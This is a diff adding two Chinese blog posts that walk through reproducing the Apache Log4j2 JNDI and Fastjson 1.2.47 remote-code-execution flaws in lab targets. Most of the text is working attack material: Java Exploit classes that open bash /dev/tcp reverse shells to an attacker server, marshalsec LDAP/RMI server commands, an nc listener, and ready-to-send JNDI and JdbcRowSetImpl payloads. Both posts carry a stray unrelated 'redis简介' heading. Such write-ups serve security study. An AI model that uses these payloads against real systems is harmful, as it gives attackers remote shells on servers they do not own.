@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>Apache Log4j2漏洞复现</title>
+      <link href="2021/11/21/apache-log4j2-lou-dong-fu-xian/"/>
+      <url>2021/11/21/apache-log4j2-lou-dong-fu-xian/</url>
+      
+        <content type="html"><![CDATA[<h1 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h1><h1 id="Apache-Log4j2漏洞复现"><a href="#Apache-Log4j2漏洞复现" class="headerlink" title="Apache Log4j2漏洞复现"></a>Apache Log4j2漏洞复现</h1><h2 id="复现（反弹shell）"><a href="#复现（反弹shell）" class="headerlink" title="复现（反弹shell）"></a>复现（反弹shell）</h2><p>借用掌控安全的靶机</p><p>地址：<a href="http://d63bb2586.lab.aqlab.cn/">http://d63bb2586.lab.aqlab.cn/</a></p><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315150430.png"></p><p>先试下dnslog</p><p>payload：${jndi:rmi://rf5cj8.dnslog.cn/a}</p><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315150731.png"></p><p>首先编写一个恶意java恶意类（包含反弹shell的系统命令），然后编译生成字节码传到我们的服务器上面</p><p>如下代码，并保存为Exploit.java</p><pre class="line-numbers language-none"><code class="language-none">public class Exploit {    public Exploit(){        try{            // 要执行的命令            String[] commands = {"bash","-c","exec 5&lt;&gt;/dev/tcp/远程服务器ip/12345;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"};            Process pc = Runtime.getRuntime().exec(commands);            pc.waitFor();        } catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv) {        Exploit e = new Exploit();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译命令</p><pre class="line-numbers language-none"><code class="language-none">javac Exploit.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我这边使用的是python3开启一个简单的HTTP服务器</p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后将生成Exploit.class文件，放到我们服务器的根目录下面</p><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315151455.png"></p><p>然后我们在服务器上利用工具（marshalsec），开启一个RMI或者LDAP服务器，并指定加载的资源为我们服务器上的class恶意字节码文件</p><pre class="line-numbers language-none"><code class="language-none">#开启LDAP服务器，并绑定到1234端口java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://远程服务器IP:8080/#Exploit" 1234  #开启RMI服务器，并绑定到1234端口java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://远程服务器IP:8080/#Exploit" 1234 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315152812.png"></p><p>成功开启ldap服务器，监听着1234端口</p><p>然后我们只需要在存在漏洞的网站处插入payload即可</p><pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://搭建RMI或LDAP的服务器地址/xx}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Tips:xx可任意填写</p><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315153252.png"></p><p>服务器成功收到shell</p><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315152700.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> log4j2 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Fastjson 1.2.47 远程命令执行漏洞</title>
+      <link href="2021/10/11/fastjson-1.2.47-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
+      <url>2021/10/11/fastjson-1.2.47-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
+      
+        <content type="html"><![CDATA[<h1 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h1><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><h2 id="复现（反弹shell）"><a href="#复现（反弹shell）" class="headerlink" title="复现（反弹shell）"></a>复现（反弹shell）</h2><p>使用vulhub的靶场复现</p><p>打开页面，就发现返回了json字符串</p><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315104224.png"></p><p>然后在本地写一个Exploit.java的文件</p><p>代码如下</p><pre class="line-numbers language-none"><code class="language-none">import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.io.IOException;import java.util.Hashtable;  public class Exploit{    public Exploit() {}     static    {        try {            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")                    ? new String[]{"cmd.exe","/c", "calc.exe"}                    : new String[]{"bash", "-c", "/bin/bash -i &gt;&amp; /dev/tcp/远程服务器ip/5252 0&gt;&amp;1"};            Runtime.getRuntime().exec(cmds);        } catch (Exception e) {            e.printStackTrace();        }    }     public static void main(String[] args) {        Exploit e = new Exploit();        System.out.println("hello world");    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编译成字节码，传到咱们的服务器根目录中（需要开启web服务）</p><p>我使用python3开启一个简单的服务器</p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用工具marshalsec，启动一个RMI（远程方法调用）或者LDAP（轻量级目录访问协议）服务器，监听9999端口，指定加载远程类Exploit.class</p><pre class="line-numbers language-none"><code class="language-none">#RMIjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://远程服务器ip/#Exploit 9999#LDAPjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://远程服务器ip/#Exploit 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后还得在我们反弹到的远程服务器中使用nc监听下5252端口</p><pre class="line-numbers language-none"><code class="language-none">nv -lvp 5252<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bp抓包post发送payload</p><pre class="line-numbers language-none"><code class="language-none"># rmi{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"lysec":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://RMI服务器IP:9999/Exploit","autoCommit":true}}# ldap{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"lysec":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://LDAP服务器:9999/Exploit","autoCommit":true}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315143925.png"></p><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220315143844.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> fastjson </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>arp欺骗</title>
       <link href="2021/10/11/arp-qi-pian/"/>
       <url>2021/10/11/arp-qi-pian/</url>
